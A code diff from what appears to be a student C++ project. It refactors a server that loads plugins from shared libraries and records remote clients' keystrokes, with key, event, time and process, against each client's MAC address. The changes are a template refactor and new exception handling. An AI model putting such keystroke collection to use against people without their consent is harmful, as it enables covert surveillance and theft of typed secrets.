@@ -5,7 +5,7 @@
 // Login   <antoine.plaskowski@epitech.eu>
 // 
 // Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
-// Last update Tue Nov  3 13:21:15 2015 Antoine Plaskowski
+// Last update Thu Nov  5 21:25:03 2015 Antoine Plaskowski
 //
 
 #include	"Server.hpp"
@@ -17,12 +17,12 @@ Server::Server(Option const &option) :
   m_dll_itime(option.get_path_lib_itime()),
   m_dll_iprotocol(option.get_path_lib_iprotocol()),
   m_dll_isocket(option.get_path_lib_isocket()),
-  m_new_idatabase(m_dll_idatabase.get_symbole<decltype(m_new_idatabase)>(NAME_FCT_NEW_IDATABASE)),
-  m_new_itime(m_dll_itime.get_symbole<decltype(m_new_itime)>(NAME_FCT_NEW_ITIME)),
-  m_new_iprotocol(m_dll_iprotocol.get_symbole<decltype(m_new_iprotocol)>(NAME_FCT_NEW_IPROTOCOL)),
-  m_iselect(m_dll_isocket.get_symbole<decltype(m_iselect)>(NAME_FCT_ISELECT)),
-  m_new_iserver(m_dll_isocket.get_symbole<decltype(m_new_iserver)>(NAME_FCT_NEW_ISERVER)),
-  m_new_istandard(m_dll_isocket.get_symbole<decltype(m_new_istandard)>(NAME_FCT_NEW_ISTANDARD)),
+  m_new_idatabase(m_dll_idatabase.get_symbole<fct_new_idatabase, ref_new_idatabase>(NAME_FCT_NEW_IDATABASE)),
+  m_new_itime(m_dll_itime.get_symbole<fct_new_itime, ref_new_itime>(NAME_FCT_NEW_ITIME)),
+  m_new_iprotocol(m_dll_iprotocol.get_symbole<fct_new_iprotocol, ref_new_iprotocol>(NAME_FCT_NEW_IPROTOCOL)),
+  m_iselect(m_dll_isocket.get_symbole<fct_iselect, ref_iselect>(NAME_FCT_ISELECT)),
+  m_new_iserver(m_dll_isocket.get_symbole<fct_new_iserver, ref_new_iserver>(NAME_FCT_NEW_ISERVER)),
+  m_new_istandard(m_dll_isocket.get_symbole<fct_new_istandard, ref_new_istandard>(NAME_FCT_NEW_ISTANDARD)),
   m_database(m_new_idatabase()),
   m_server(m_new_iserver(option.get_host(), option.get_port())),
   m_in(m_new_istandard(ISocket::In)),
@@ -62,21 +62,24 @@ bool	Server::run(void)
   bool	remove = false;
   for (auto it = m_clients.begin(); it != m_clients.end(); it++)
     {
-      if (*it != nullptr)
+      try
 	{
 	  if ((*it)->run(&m_timeout) == true)
-	    {
-	      delete *it;
-	      remove = true;
-	      *it = nullptr;
-	    }
+	    throw std::exception();
 	  else
 	    {
 	      auto ret = (*it)->get_keyboard();
 
 	      for (auto lol = ret.begin(); lol != ret.end(); lol++)
-		m_database.insert_keyboard((*it)->get_mac_address(), (*lol)->time, (*lol)->event, (*lol)->key, (*lol)->process);
+		m_database.insert_keyboard((*it)->get_mac_address(), **lol);
 	    }
+	}
+      catch (std::exception &e)
+	{
+	  std::cerr << e.what() << std::endl;
+	  delete *it;
+	  remove = true;
+	  *it = nullptr;	      
 	}
     }
   if (remove == true)
